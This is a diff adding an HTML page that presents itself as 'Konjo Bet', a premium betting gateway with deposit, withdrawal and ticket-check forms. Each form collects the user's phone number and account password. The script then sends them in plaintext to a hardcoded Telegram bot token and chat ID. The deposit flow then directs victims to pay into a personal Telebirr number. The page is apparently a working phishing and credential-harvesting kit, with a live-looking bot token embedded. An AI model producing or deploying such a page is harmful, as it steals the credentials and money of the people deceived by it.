@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Konjo Bet | Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* --- BLOGGER FIX: HIDE TOP NAVBAR --- */
+        #navbar-iframe {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        
+        :root {
+            --primary: #f97316;
+            --primary-glow: rgba(249, 115, 22, 0.4);
+            --secondary: #0ea5e9;
+            --bg-dark: #0f172a;
+            --glass-bg: rgba(30, 41, 59, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --text-white: #ffffff;
+            --text-gray: #94a3b8;
+            --radius: 20px;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body { 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            margin: 0; 
+            padding: 0;
+            background-color: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(14, 165, 233, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(249, 115, 22, 0.1) 0%, transparent 40%);
+            color: var(--text-white);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0; left: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            z-index: 100;
+        }
+
+        .glass-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            width: 95%;
+            max-width: 420px;
+            padding: 35px 25px;
+            border-radius: var(--radius);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            animation: floatUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes floatUp {
+            from { opacity: 0; transform: translateY(30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .brand-header { text-align: center; margin-bottom: 30px; }
+        
+        .brand-header h1 {
+            margin: 0;
+            font-size: 28px;
+            background: linear-gradient(135deg, #fff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        .brand-header span { color: var(--primary); -webkit-text-fill-color: var(--primary); }
+
+        .menu-grid { display: grid; gap: 12px; }
+
+        .action-btn {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            color: var(--text-white);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .action-btn i { font-size: 18px; width: 30px; }
+
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateX(5px);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, #ea580c 100%);
+            border: none;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px var(--primary-glow);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 25px -5px var(--primary-glow);
+            background: linear-gradient(135deg, #fb923c 0%, #ea580c 100%);
+        }
+
+        .btn-telegram {
+            background: rgba(14, 165, 233, 0.1);
+            color: #38bdf8;
+            border-color: rgba(14, 165, 233, 0.2);
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .form-section { display: none; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        
+        .input-group i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-gray);
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 16px 16px 45px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--glass-border);
+            border-radius: 14px;
+            color: white;
+            font-size: 15px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 0 4px rgba(249, 115, 22, 0.1);
+        }
+
+        input::placeholder { color: rgba(255,255,255, 0.3); }
+
+        .section-title {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .payment-info {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .telebirr-card {
+            background: white;
+            color: var(--bg-dark);
+            padding: 20px;
+            border-radius: 16px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .acc-number {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary);
+            letter-spacing: 1px;
+            margin-top: 5px;
+            display: block;
+            position: relative;
+            z-index: 2;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: var(--radius);
+            z-index: 10;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .back-link {
+            text-align: center;
+            margin-top: 15px;
+            color: var(--text-gray);
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container" id="app">
+    <div class="glass-card">
+        <div id="main-menu">
+            <div class="brand-header">
+                <h1>Konjo <span>Bet</span></h1>
+                <p style="margin: 5px 0 0; font-size: 13px; color: var(--text-gray);">Premium Betting Gateway</p>
+            </div>
+            
+            <div class="menu-grid">
+                <button class="action-btn" onclick="showForm('deposit')">
+                    <span><i class="fa-solid fa-wallet" style="color: #4ade80;"></i> Deposit Funds</span>
+                    <i class="fa-solid fa-chevron-right" style="font-size: 12px; opacity: 0.5;"></i>
+                </button>
+                <button class="action-btn" onclick="showForm('withdraw')">
+                    <span><i class="fa-solid fa-money-bill-transfer" style="color: #f87171;"></i> Withdraw Cash</span>
+                    <i class="fa-solid fa-chevron-right" style="font-size: 12px; opacity: 0.5;"></i>
+                </button>
+                <button class="action-btn" onclick="showForm('ticket')">
+                    <span><i class="fa-solid fa-ticket" style="color: #fbbf24;"></i> Check Ticket</span>
+                    <i class="fa-solid fa-chevron-right" style="font-size: 12px; opacity: 0.5;"></i>
+                </button>
+                <button class="action-btn btn-telegram" onclick="window.open('https://t.me/konjobetb', '_blank')">
+                    <i class="fa-brands fa-telegram"></i> Join Telegram Channel
+                </button>
+            </div>
+        </div>
+
+        <div id="deposit-form" class="form-section">
+            <div class="section-title"><i class="fa-solid fa-circle-plus" style="color: #4ade80;"></i> Deposit</div>
+            <div class="input-group">
+                <i class="fa-solid fa-coins"></i>
+                <input type="number" id="dep-amount" placeholder="Amount (ETB)">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-phone"></i>
+                <input type="tel" id="dep-phone" placeholder="Phone Number">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="dep-pass" placeholder="Konjo bet Password">
+            </div>
+            <button class="action-btn btn-primary" onclick="submitData('deposit')">Proceed to Pay</button>
+            <div class="back-link" onclick="showMenu()">Cancel</div>
+        </div>
+
+        <div id="withdraw-form" class="form-section">
+            <div class="section-title"><i class="fa-solid fa-circle-minus" style="color: #f87171;"></i> Withdraw</div>
+            <div class="input-group">
+                <i class="fa-solid fa-coins"></i>
+                <input type="number" id="wd-amount" placeholder="Amount (ETB)">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-phone"></i>
+                <input type="tel" id="wd-phone" placeholder="Phone Number">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="wd-pass" placeholder="Konjo bet Password">
+            </div>
+            <button class="action-btn btn-primary" onclick="submitData('withdraw')">Request Withdrawal</button>
+            <div class="back-link" onclick="showMenu()">Cancel</div>
+        </div>
+
+        <div id="ticket-form" class="form-section">
+            <div class="section-title"><i class="fa-solid fa-ticket" style="color: #fbbf24;"></i> Check Status</div>
+            <div class="input-group">
+                <i class="fa-solid fa-hashtag"></i>
+                <input type="text" id="tk-id" placeholder="Ticket ID (e.g. T-88291)">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-phone"></i>
+                <input type="tel" id="tk-phone" placeholder="Phone Number">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="tk-pass" placeholder="Account Password">
+            </div>
+            <button class="action-btn btn-primary" onclick="submitData('ticket')">Check Status</button>
+            <div class="back-link" onclick="showMenu()">Cancel</div>
+        </div>
+
+        <div id="payment-box" class="payment-info">
+            <div style="font-size: 50px; margin-bottom: 10px;">💳</div>
+            <h3 style="margin: 0; color: white;">Telebirr Payment</h3>
+            <p style="font-size: 13px; color: var(--text-gray); margin-top: 5px;">ውድ ደንበኛ ክፍያውን ለመፈፀም በዚህ ስልክ ቁጥር ገቢ ያድርጉ!:</p>
+            <div class="telebirr-card">
+                <div style="font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #64748b;">Merchant Account</div>
+                <span class="acc-number">0992534646</span>
+            </div>
+            <p style="font-size: 12px; color: #94a3b8; font-style: italic; margin-bottom: 20px;">
+                ክፍያውን ከፈፀሙ በኋላ ወዲያው ወደ ቆንጆ ቤት አካውንቶ ተቀማጭ ይደረግሎታል✅
+            </p>
+            <button class="action-btn btn-primary" onclick="showMenu()">
+                <i class="fa-solid fa-check"></i> I Have Paid
+            </button>
+        </div>
+
+        <div id="loading" class="loading-overlay">
+            <div class="spinner"></div>
+            <div style="font-size: 14px; font-weight: 500;">Connecting to Bot...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const botToken = "6345617377:AAFRy0V-nuZoz-m5u0LSCtrOUa2F-vskuDQ"; 
+    const userId = "6795062022"; 
+
+    // showMenu and showForm functions keep the logic working
+    function showMenu() {
+        document.querySelectorAll('.form-section, .payment-info').forEach(el => el.style.display = 'none');
+        document.getElementById('main-menu').style.display = 'block';
+    }
+
+    function showForm(type) {
+        document.getElementById('main-menu').style.display = 'none';
+        document.getElementById(type + '-form').style.display = 'block';
+    }
+
+    function submitData(type) {
+        let message = "";
+        let amount, phone, pass, id;
+
+        if (type === 'deposit') {
+            amount = document.getElementById('dep-amount').value;
+            phone = document.getElementById('dep-phone').value;
+            pass = document.getElementById('dep-pass').value;
+            if (!amount || !phone || !pass) { alert("Please fill all fields"); return; }
+            message = `🔥 <b>DEPOSIT REQUEST</b>\n\n💵 <b>Amount:</b> ${amount} ETB\n📱 <b>Phone:</b> ${phone}\n🔐 <b>Pass:</b> ${pass}`;
+        } 
+        else if (type === 'withdraw') {
+            amount = document.getElementById('wd-amount').value;
+            phone = document.getElementById('wd-phone').value;
+            pass = document.getElementById('wd-pass').value;
+            if (!amount || !phone || !pass) { alert("Please fill all fields"); return; }
+            message = `💸 <b>WITHDRAW REQUEST</b>\n\n💵 <b>Amount:</b> ${amount} ETB\n📱 <b>Phone:</b> ${phone}\n🔐 <b>Pass:</b> ${pass}`;
+        } 
+        else if (type === 'ticket') {
+            id = document.getElementById('tk-id').value;
+            phone = document.getElementById('tk-phone').value;
+            pass = document.getElementById('tk-pass').value;
+            if (!id || !phone || !pass) { alert("Please fill all fields"); return; }
+            message = `🎫 <b>TICKET CHECK</b>\n\n🆔 <b>Ticket:</b> ${id}\n📱 <b>Phone:</b> ${phone}\n🔐 <b>Pass:</b> ${pass}`;
+        }
+
+        const loading = document.getElementById('loading');
+        loading.style.display = 'flex';
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                loading.style.display = 'none';
+                if (data.ok) {
+                    if (type === 'deposit') {
+                        document.getElementById('deposit-form').style.display = 'none';
+                        document.getElementById('payment-box').style.display = 'block';
+                    } else {
+                        alert("✅ Request Sent to Admin Successfully!");
+                        showMenu();
+                    }
+                } else {
+                    alert("⚠️ Bot Error: " + data.description);
+                }
+            })
+            .catch(err => {
+                loading.style.display = 'none';
+                alert("❌ Connection failed. Please check your internet.");
+            });
+    }
+</script>
+
+</body>
+</html>
+
